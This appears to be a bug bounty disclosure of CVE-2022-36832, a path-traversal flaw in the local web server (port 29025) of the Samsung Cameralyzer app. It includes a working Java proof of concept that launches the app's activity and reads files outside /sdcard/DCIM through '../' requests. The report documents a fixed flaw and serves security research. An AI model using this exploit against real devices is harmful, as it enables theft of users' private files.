# Details

<table>
    <tr>
        <td>Name</td>
        <td>Cameralyzer</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.sec.factory.cameralyzer</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.03.31</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.08.02</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-36832">CVE-2022-36832</a> (SVE-2022-0807)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$600</td>
    </tr>
</table>

# Description

Oversecured report:
![](Oversecured_report.png)

The app was running a local web server on port `29025`. One of the URL handlers, `/DCIM/`, returned files from the `/sdcard/DCIM` folder, but was also vulnerable to path-traversal. This allowed the attacker, who was on the same network as the victim, to access not only media such as the user's photos or videos, but also any other files that the app had access to.

**Proof of Concept**

```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    final String relativePath = "../test.txt"; // base path is /sdcard/DCIM/
    new Thread(() -> launchStealer(relativePath)).start();

    Intent i = new Intent();
    i.setClassName("com.sec.factory.cameralyzer", "com.sec.factory.cameralyzer.CzrV2Activity");
    i.putExtra("hashsign", "q");
    i.putExtra("testtype", "q");
    startActivity(i);
}

private void launchStealer(String relativePath) {
    while (true) {
        try {
            HttpURLConnection connection = (HttpURLConnection) new URL("http://127.0.0.1:29025/DCIM/" + relativePath).openConnection();
            InputStream inputStream = connection.getInputStream();
            Log.d("evil", "Response: " + IOUtils.toString(inputStream));
            inputStream.close();
            connection.disconnect();
            return;
        } catch (Throwable th) {
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                return;
            }
        }
    }
}
```

## References

- [Oversecured Blog. Android security checklist: theft of arbitrary files. Local web servers](https://blog.oversecured.com/Android-security-checklist-theft-of-arbitrary-files/#local-web-servers)
